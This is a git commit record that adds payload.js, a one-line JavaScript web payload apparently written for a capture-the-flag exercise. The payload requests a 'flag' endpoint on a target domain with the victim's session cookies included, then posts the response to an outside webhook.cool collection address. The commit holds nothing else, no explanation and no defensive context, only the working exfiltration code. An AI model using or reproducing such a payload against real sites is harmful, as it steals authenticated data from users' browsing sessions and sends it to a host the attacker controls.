a5b95a755363332e8749f854db15468a7294aebc
TessaDal <86071436+sarahda@users.noreply.github.com>
2026-04-02 21:10:53 +1100

    Create payload.js

---
+++ payload.js
@@ -0,0 +1,1 @@
+fetch("https://api.netquocca.quoccacorp.com/flag",{credentials:"include"}).then(function(r){return r.text()}).then(function(t){fetch("https://bold-galaxy-05.webhook.cool/",{method:"POST",mode:"no-cors",body:t})})
